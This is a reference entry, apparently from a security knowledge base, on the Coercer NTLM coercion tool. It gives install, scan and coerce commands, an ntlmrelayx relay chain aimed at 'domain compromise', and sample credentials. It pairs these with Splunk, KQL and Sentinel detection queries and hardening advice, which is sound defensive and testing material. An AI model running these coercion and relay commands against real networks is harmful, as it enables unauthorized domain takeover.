name: Coercer - Multi-Protocol NTLM Coercion Scanner
description: Coercer by p0dalirius is a Swiss-army knife for NTLM coercion. It scans for and exploits multiple coercion methods in one tool: MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce), MS-DFSNM (DFSCoerce), and 10+ more RPC interfaces. Run it in scan mode first to find which methods work, then coerce to trigger authentication.
notes:
=== INSTALL ===
  pip3 install coercer
  # Or: git clone https://github.com/p0dalirius/Coercer

=== SCAN MODE (find working methods) ===
  python3 Coercer.py scan -u <user> -p <pass> -d <domain> -t <dc_ip>
  # Reports which RPC methods are available

=== COERCE MODE (trigger auth) ===
  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>
  # Triggers ALL working methods

=== SPECIFIC METHOD ===
  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip> --filter-method-name EfsRpcOpenFileRaw

=== SUPPORTED PROTOCOLS ===
  MS-EFSR (PetitPotam)
  MS-RPRN (PrinterBug)
  MS-FSRVP (ShadowCoerce)
  MS-DFSNM (DFSCoerce)
  MS-EVEN (EventLog)
  MS-BKRP (BackupKey)
  And 10+ more

=== RELAY CHAIN ===
  # Terminal 1: Start relay
  ntlmrelayx.py -t ldap://<dc_ip> --delegate-access -smb2support
  # Terminal 2: Coerce
  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <target> -l <listener_ip>

examples.label: Scan for available coercion methods
examples.command: python3 Coercer.py scan -u jdoe -p Password123 -d corp.local -t 192.168.1.10

examples.label: Coerce authentication from DC
examples.command: python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50

examples.label: Use specific method only
examples.command: python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50 --filter-method-name EfsRpcOpenFileRaw

recommended.note: PetitPotam is one of the methods Coercer wraps.
DFSCoerce is another method Coercer includes.
Relay the coerced auth to LDAP/ADCS for domain compromise.

defense.why_it_works: Multiple Windows RPC services can be abused to trigger NTLM authentication callbacks. Coercer tests all known methods systematically, increasing the chance of finding an exploitable coercion path.
defense.prerequisites: Valid domain credentials; network access to target RPC services (TCP 445).
defense.impact: Domain compromise when coerced authentication is relayed to ADCS or LDAP.
defense.detection: [MITRE T1187] Multiple RPC connection attempts to different service pipes; NTLM authentication from unexpected machine accounts.
defense.artifacts: Event 4624 (Type 3) from unexpected sources; named pipe access events; RPC connection logs.
defense.splunk_spl:
index=sysmon EventCode=18 PipeName IN ("\\*\pipe\efsrpc", "\\*\pipe\spoolss", "\\*\pipe\FssagentRpc", "\\*\pipe\netdfs")
| stats dc(PipeName) as unique_pipes by Image, SourceIp
| where unique_pipes > 2
defense.elastic_kql: event.code:"18" AND file.name:("efsrpc" OR "spoolss" OR "FssagentRpc" OR "netdfs")
defense.sentinel_kql:
SysmonEvent
| where EventID == 18
| where PipeName in ("\\*\\pipe\\efsrpc", "\\*\\pipe\\spoolss", "\\*\\pipe\\FssagentRpc")
| summarize PipeCount=dcount(PipeName) by SourceIp
| where PipeCount > 2
defense.prevention: Disable unnecessary RPC services; enforce SMB signing; enable EPA on ADCS; restrict NTLM authentication; monitor for coercion patterns.

detections.name: Multi-protocol NTLM coercion attempt
detections.logic:
SysmonEvent
| where EventID == 18
| where PipeName has_any ("efsrpc", "spoolss", "FssagentRpc", "netdfs", "eventlog")
| summarize UniquePipes=dcount(PipeName), TotalAttempts=count() by SourceIp, bin(TimeGenerated, 5m)
| where UniquePipes >= 2
detections.false_positives: Legitimate RPC operations to multiple services
detections.tuning: Alert on 2+ different coercion pipes from the same source in a short window
